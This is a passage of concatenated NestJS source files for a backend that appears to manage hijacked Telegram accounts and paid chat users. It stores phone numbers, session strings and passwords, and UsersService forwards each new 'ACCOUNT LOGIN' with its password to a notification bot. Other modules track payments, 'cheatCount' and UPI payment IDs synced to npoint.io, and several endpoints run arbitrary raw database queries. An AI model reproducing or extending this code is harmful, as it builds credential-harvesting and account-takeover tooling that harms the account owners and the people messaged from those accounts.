UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService {\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.findOne().then(() => {\n            setInterval(async () => {\n                await this.refreshUPIs();\n                await this.checkNpoint();\n            }, 5 * 60000);\n        });\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshing UPIs\");\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (result) {\n            this.upiIds = result;\n        }\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds;\n        }\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (!result) return null;\n\n        this.upiIds = result;\n        console.log(\"Refreshed UPIs\");\n        return result;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {},\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      chatCallCounts: [],\n      totalCalls: 0,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n\n  \n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  async findAll() {\n    return this.usersService.findAll();\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService\n  ) {}\n\n  async create(user: CreateUserDto): Promise<User | undefined> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(): Promise<User[]> {\n    return this.userModel.find().exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    console.log(filter)\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<User[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.userModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n}\n","export enum PrivacyLevelEnum {\r\n    everybody = 'everybody',\r\n    contacts = 'contacts',\r\n    nobody = 'nobody'\r\n}\r\n\r\nexport type PrivacyLevel = keyof typeof PrivacyLevelEnum;\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\nexport interface ChatStatistics {\r\n    period: 'day' | 'week' | 'month';\r\n    totalMessages: number;\r\n    